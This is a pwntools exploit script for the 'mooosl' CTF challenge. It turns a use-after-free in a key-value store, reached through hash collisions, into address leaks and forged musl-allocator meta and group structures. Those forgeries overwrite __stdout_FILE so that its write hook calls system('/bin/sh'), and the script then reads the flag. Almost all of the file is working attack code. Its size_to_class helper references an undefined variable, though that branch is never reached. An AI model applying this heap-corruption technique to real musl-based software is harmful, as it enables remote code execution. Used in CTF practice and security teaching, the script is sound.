#encoding:utf-8
from pwn import *
import re
from binascii import unhexlify

ip = '127.0.0.1'
port = 9999 
local = 1
filename = './mooosl'
libc_name = './libc.so'

size_classes = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 18, 20, 25, 31, 36, 42, 50, 63, 72, 84, 102, 127, 146, 170, 204, 255, 292, 340, 409, 511, 584, 682, 818, 1023, 1169, 1364, 1637, 2047, 2340, 2730, 3276, 4095, 4680, 5460, 6552, 8191]
small_cnt_tab = [[30, 30, 30], [31, 15, 15], [20, 10, 10], [31, 15, 7], [25, 12, 6], [21, 10, 5], [18, 8, 4], [31, 15, 7], [28, 14, 6]]
IB = 0x4
UNIT = 0x10

def create_connect():
	global io, elf, libc

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch, timeout=3, log_level=1)
	
	if local:
		io = process(filename)
		if elf.arch == 'amd64':
			libc_name = '/lib/x86_64-linux-musl/libc.so'
		elif elf.arch == 'i386':
			libc_name = '/lib/x86_64-linux-musl/libc.so'

	else:
		io = remote(ip, port)
	try:
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'(WMCTF{.*?})'),
        re.compile(r'(OOO{.*?})'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]

    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])

    return None

''' a slot bit from mask transfer to index'''
def a_ctz_32(x):
	debruijn32 = [0, 1, 23, 2, 29, 24, 19, 3, 30, 27, 25, 11, 20, 8, 4, 13, 31, 22, 28, 18, 26, 10, 7, 12, 21, 17, 9, 6, 16, 5, 15, 14]
	return debruijn32[(x&-x)*0x076be629 >> 27]

def a_clz_32(x):
	x >>= 1
	x |= x >> 1
	x |= x >> 2
	x |= x >> 4
	x |= x >> 8
	x |= x >> 16
	x += 1
	return 31 - a_ctz_32(x)

def size_to_class(n):
	n = (n + IB - 1)>>4
	if n < 10: return n
	n += 1
	idx = (28 - a_clz_32(n))*4 + 8
	if (n > size_classes[i+1]): i += 2
	if (n > size_classes[i]): i += 1
	return i

def class_to_size(idx):
	return size_classes[idx]*0x10

def store(key, value, key_size=0x1, value_size=0x1):
	sla(b'option: ', b'1')

	key_size = key_size if key_size >= len(key) else len(key)
	sla(b'key size: ', str(key_size).encode())
	if key_size > len(key):
		sla(b'key content: ', key.encode() if isinstance(key, str) else key)
	else:
		sa(b'key content: ', key.encode() if isinstance(key, str) else key)

	value_size = value_size if value_size >= len(value) else len(value)
	sla(b'value size: ', str(value_size).encode())
	if value_size > len(value):
		sla(b'value content: ', value.encode() if isinstance(value, str) else value)
	else:
		sa(b'value content: ', value.encode() if isinstance(value, str) else value)

def query(key, key_size=0x1):
	sla(b'option: ', b'2')

	key_size = key_size if key_size >= len(key) else len(key)
	sla(b'key size: ', str(key_size).encode())
	if key_size > len(key):
		sla(b'key content: ', key.encode() if isinstance(key, str) else key)
	else:
		sa(b'key content: ', key.encode() if isinstance(key, str) else key)	

def delete(key, key_size=0x1):
	sla(b'option: ', b'3')

	key_size = key_size if key_size >= len(key) else len(key)
	sla(b'key size: ', str(key_size).encode())
	if key_size > len(key):
		sla(b'key content: ', key.encode() if isinstance(key, str) else key)
	else:
		sa(b'key content: ', key.encode() if isinstance(key, str) else key)	

def get_hash(content):
	x = 0x7e5
	for c in content:
		x = ord(c) + x * 0x13377331
	return x & 0xfff

def get_whole_hash(content):
	x = 0x7e5
	for c in content:
		x = ord(c) + x * 0x13377331
	return x 

def find_key(h, length=0x10):
	while True:
		x = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
		if get_hash(x) == h:
			return x.encode()

def pwn():
	cc()
	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x15E2)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)')
	store(b'A', b'A') # A A A A A A U
	for i in range(5):
		query(b'A'*0x30) # A F F F F F U

	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x15E2)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)')
	store(b'B', b'A'*0x30) # ->U A A A A [U] U
	store(find_key(get_hash('B')), b'A') # U A A A U [U] U

	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x15E2)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)')
	delete(b'B') # ->F A A A U [F] U

	for i in range(3):
		query(b'A'*0x30) # ->F F F F U [F] U

	store(b'C', b'A'*0x1400) # ->F F F F U [U] U	
	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x15E2)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)')
	query(b'B') # ->A A A F U [U] U

	ru(b'0x30:')
	t = ru(b'7f0000')
	key_addr = u64(unhexlify(t[:16])) + 0x10
	log.success('key_addr: 0x%x', key_addr)
	libc.address = u64(unhexlify(t[-16:])) + 0x3fe0
	log.success('libc_addr: 0x%x', libc.address)
	mmap_addr = libc.address - 0x4000
	log.success('mmap_addr: 0x%x', mmap_addr)
	stdout = libc.sym['__stdout_FILE']
	log.success('__stdout_FILE: 0x%x', stdout)

	for i in range(3):
		query(b'A'*0x30)

	# g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x13A1)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)')
	query(flat([key_addr, mmap_addr, 1, 8, 0xb4c06217, 0]))
	query(b'B')
	ru(b'0x8:')
	meta_addr = u64(unhexlify(rr(16)))
	log.success('meta_addr: 0x%x', meta_addr)
	meta_area = meta_addr & -4096
	log.success('meta_area: 0x%x', meta_area)

	for i in range(3):
		query(b'A'*0x30)

	query(flat([key_addr, meta_area, 1, 8, 0xb4c06217, 0]))
	query(b'B') # ->A A A A U [F] U
	ru(b'0x8:')
	secret = u64(unhexlify(rr(16)))
	log.success('meta_area: 0x%x', meta_area)
	log.success('secret: 0x%x', secret)

	fake_meta_ptr = mmap_addr + 0x2000 + 0x10
	fake_group_ptr = mmap_addr + 0x2000 + 0x40
	fake_slot = fake_group_ptr + 0x10
	sc = size_to_class(0x90)
	freeable = 1
	last_idx = 0
	avail_mask = 0
	maplen = 1

	poc = flat({
		0xaa0: secret,											# secret

		0xab0: stdout-0x18,										# prev
		0xab8: fake_group_ptr,									# next
		0xac0: fake_group_ptr,									# mem
		0xac8: avail_mask,										# avail_mask, freed_mask
		0xad0: (maplen<<12)|(sc<<6)|(freeable<<5)|(last_idx),	# last_idx, freeable, sizeclass, maplen
		
		0xae0: fake_meta_ptr,									# meta
		0xae8: 1,												# active_idx
		0xaf0: 0x4141414141414141,								# storage
		0xaf8: 0x4141414141414141,

		0xca0:  0,
		0xca8:	0,
		0xcb0:  mmap_addr+0x2200+0x30,
		0xcb8:	0,
		0xcc0: (1<<12)|(5<<6)|(0<<5)|(1),
		0xcc8:  0,
		0xcd0:  mmap_addr+0x2200,
		0xcd8:  1,
		0xce0:  0x42,
		}, filler=b'\x00', length=0x1400)
	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x13A1)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)')
	query(poc) # 0x1560
	for i in range(2):
		query(b'A'*0x30)

	store(b'A', flat([mmap_addr + 0x2240, fake_slot, 1, 8, 0xb4c06217, 0]))
	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x13A1)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)\n')
	log.success('__stdout_FILE: 0x%x', stdout)
	delete(b'B')

	freeable = 0
	last_idx = 1
	avail_mask = 0
	maplen = 1
	poc = flat({
		0xa90: secret,											# secret

		0xaa0: 0,												# prev
		0xaa8: 0,												# next
		0xab0: fake_group_ptr,									# mem
		0xab8: avail_mask,										# avail_mask, freed_mask
		0xac0: (maplen<<12)|(sc<<6)|(freeable<<5)|(last_idx),	# last_idx, freeable, sizeclass, maplen
		
		0xad0: fake_meta_ptr,									# meta
		0xad8: 1,												# active_idx
		0xae0: 0x4141414141414141,								# storage
		0xae8: 0x4141414141414141,

		0xc90:  0,
		0xc98:	0,
		0xca0:  mmap_addr+0x2230,
		0xca8:	0,
		0xcb0: (1<<12)|(4<<6)|(0<<5)|(1),
		0xcb8:  0,
		0xcc0:  mmap_addr+0x2200,
		0xcc8:  1,
		0xcd0:  0x42,
		}, filler=b'\x00', length=0x1400)

	
	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x13A1)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)\n')
	query(poc) # 0x1570
	query(b'A'*0x30)
	store(b'A', flat([mmap_addr + 0x2240, fake_slot, 1, 0x20, 0xb4c06217, 0]))
	#g('b *$rebase(0x15BA)\nb *$rebase(0x15CA)\nb *$rebase(0x13A1)\nb *$rebase(0x169C)\nb *$rebase(0x17F1)\n')
	delete(b'B')

	freeable = 1
	last_idx = 1
	avail_mask = 2
	maplen = 1
	poc = flat({
		0xa80: secret,											# secret

		0xa90: fake_meta_ptr,									# prev
		0xa98: fake_meta_ptr,									# next
		0xaa0: stdout - 0x10,									# mem
		0xaa8: 1,												# avail_mask, freed_mask
		0xab0: (maplen<<12)|(sc<<6)|(freeable<<5)|(last_idx),	# last_idx, freeable, sizeclass, maplen

		0xac0: 0,												# prev
		0xac8: 0,												# next
		0xad0: stdout - 0x10,									# mem
		0xad8: 2,												# avail_mask, freed_mask
		0xae0: (maplen<<12)|(sc<<6)|(freeable<<5)|(last_idx),	# last_idx, freeable, sizeclass, maplen
		}, filler=b'\x00', length=0x1400)
	query(poc)

	stdout = flat({ 
		0x0: b'/bin/sh\x00',
		0x20: 1, # f->wpos 
		0x28: 1, # f->wend 
		0x48: libc.sym['system'] # f->write 
		}, filler=b'\x00', length=0x90)

	store(b'A', stdout)
	sl(b'cat flag')
	log.success('flag: %s', regexp_out(ru(b'}')))
	cl()

if __name__ == '__main__':
	pwn()